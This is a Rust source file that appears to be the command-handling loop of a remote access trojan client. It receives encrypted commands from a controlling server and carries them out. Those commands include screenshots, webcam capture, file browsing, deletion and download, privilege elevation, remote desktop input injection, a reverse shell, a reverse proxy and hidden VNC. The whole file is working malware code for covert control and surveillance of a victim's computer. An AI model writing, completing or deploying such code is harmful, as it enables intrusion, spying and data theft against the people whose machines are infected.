use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
use crate::features::process::{process_list, kill_process};
use crate::features::system_commands::system_commands;
use crate::features::webcam::take_webcam;
use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
use common::packets::*;
use rand_chacha::ChaCha20Rng;
use tokio::sync::oneshot;
use tokio::sync::mpsc;
use std::sync::Mutex;
use once_cell::sync::Lazy;
use crate::features::file_manager::FileManager;
use crate::features::reverse_proxy::ReverseProxy;
use common::connection::{ConnectionReader, ConnectionWriter};
use crate::service::config::get_config;
use crate::REVERSE_SHELL;

static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
    Mutex::new(None)
});

pub async fn reading_loop(
    mut reader: ConnectionReader<ClientboundPacket>,
    close_sender: oneshot::Sender<()>,
    secret: Option<Vec<u8>>,
    mut nonce_generator: Option<ChaCha20Rng>,
) {
    let config = get_config();
    let mut reverse_proxy = ReverseProxy::new();
    let mut file_manager = FileManager::new();
    let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
    'l: loop {
        match reader.read_packet(&secret, nonce_generator.as_mut()).await {
            Ok(Some(ClientboundPacket::InitClient)) => {
                let client_info = client_info(config.group.clone());
                
                match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                    Ok(_) => println!("Sent client info to server"),
                    Err(e) => {
                        println!("Error sending client info: {}", e);
                        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
                        match send_packet(ServerboundPacket::ClientInfo(client_info)).await {
                            Ok(_) => println!("Sent client info to server on retry"),
                            Err(e) => println!("Failed to send client info on retry: {}", e),
                        }
                    }
                }
            }

            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
                match display.parse::<i32>() {
                    Ok(display_id) => {
                        let screenshot_data = take_screenshot(display_id);
                        match send_packet(ServerboundPacket::ScreenshotResult(screenshot_data)).await {
                            Ok(_) => println!("Sent screenshot to server"),
                            Err(e) => println!("Error sending screenshot: {}", e),
                        }
                    },
                    Err(e) => println!("Invalid display ID: {}", e),
                }
            }

            Ok(Some(ClientboundPacket::GetProcessList)) => {
                let process_list = process_list();
                match send_packet(ServerboundPacket::ProcessList(process_list)).await {
                    Ok(_) => println!("Sent process list to server"),
                    Err(e) => println!("Error sending process list: {}", e),
                }
            }

            Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),

            Ok(Some(ClientboundPacket::Disconnect)) => std::process::exit(0),

            Ok(Some(ClientboundPacket::Reconnect)) => {
                println!("Server requested reconnection. Reconnecting...");
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }

            Ok(Some(ClientboundPacket::ManageSystem(command))) => system_commands(&command),

            Ok(Some(ClientboundPacket::AvailableDisks)) => file_manager.list_available_disks().await,

            Ok(Some(ClientboundPacket::PreviousDir)) => file_manager.navigate_to_parent().await,

            Ok(Some(ClientboundPacket::ViewDir(path))) => file_manager.view_folder(&path).await,

            Ok(Some(ClientboundPacket::RemoveDir(path))) => file_manager.remove_directory(&path).await,

            Ok(Some(ClientboundPacket::RemoveFile(path))) => file_manager.remove_file(&path).await,

            Ok(Some(ClientboundPacket::DownloadFile(path))) => file_manager.download_file(&path).await,
            
            Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => visit_website(&visit_data),

            Ok(Some(ClientboundPacket::ShowMessageBox(message_box_data))) => show_messagebox(message_box_data),

            Ok(Some(ClientboundPacket::ElevateClient)) => elevate_client(),

            Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => start_remote_desktop(config),

            Ok(Some(ClientboundPacket::StopRemoteDesktop)) => stop_remote_desktop(),

            Ok(Some(ClientboundPacket::MouseClick(click_data))) => mouse_click(click_data),

            Ok(Some(ClientboundPacket::KeyboardInput(input_data))) => keyboard_input(input_data),

            Ok(Some(ClientboundPacket::StartShell)) => reverse_shell_lock.start_shell(),

            Ok(Some(ClientboundPacket::ExitShell)) => reverse_shell_lock.send_shell_command(b"exit"),

            Ok(Some(ClientboundPacket::ShellCommand(data))) => reverse_shell_lock.send_shell_command(format!("{}\n", data).as_bytes()),

            Ok(Some(ClientboundPacket::StartReverseProxy(port))) => {
                reverse_proxy.setup(config.ip.clone(), port);
                reverse_proxy.start().await;
            }

            Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,

            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
            
            Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
            
            Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
            
            Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe"),

            Ok(Some(p)) => {
                println!("!!Unhandled packet: {:?}", p);
            }
            
            Err(e) => {
                println!("Connection error: {}", e);
                reverse_shell_lock.send_shell_command(b"exit");
                reverse_proxy.stop().await;
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }
            
            _ => {
                println!("Connection closed");
                reverse_shell_lock.send_shell_command(b"exit");
                reverse_proxy.stop().await;
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }
        }
    }
    
    clear_packet_sender();
}

pub async fn writing_loop(
    mut writer: ConnectionWriter<ServerboundPacket>,
    mut rx: oneshot::Receiver<()>,
    secret: Option<Vec<u8>>,
    mut nonce_generator: Option<ChaCha20Rng>,
) {
    let (packet_tx, mut packet_rx) = mpsc::channel::<ServerboundPacket>(32);
    
    {
        let mut sender = PACKET_SENDER.lock().unwrap();
        *sender = None;
        *sender = Some(packet_tx);
    }
    
    loop {
        tokio::select! {
            _ = &mut rx => {
                println!("Closing writing loop");
                break;
            },
            Some(packet) = packet_rx.recv() => {
                if let Err(e) = writer.write_packet(
                    packet,
                    &secret,
                    nonce_generator.as_mut()
                ).await {
                    println!("Error sending packet: {}", e);
                    break;
                }
            }
        }
    }
}

// Helper function to clear the packet sender
fn clear_packet_sender() {
    let mut sender = PACKET_SENDER.lock().unwrap();
    *sender = None;
}

pub async fn send_packet(packet: ServerboundPacket) -> Result<(), String> {
    for _ in 0..5 {
        // Try to get the packet sender
        let sender_opt = {
            let sender_guard = PACKET_SENDER.lock().unwrap();
            sender_guard.clone()
        };
        
        if let Some(sender) = sender_opt {
            return sender.send(packet).await.map_err(|e| e.to_string());
        }
        
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }    
    Err("Packet sender not initialized after multiple attempts".to_string())
}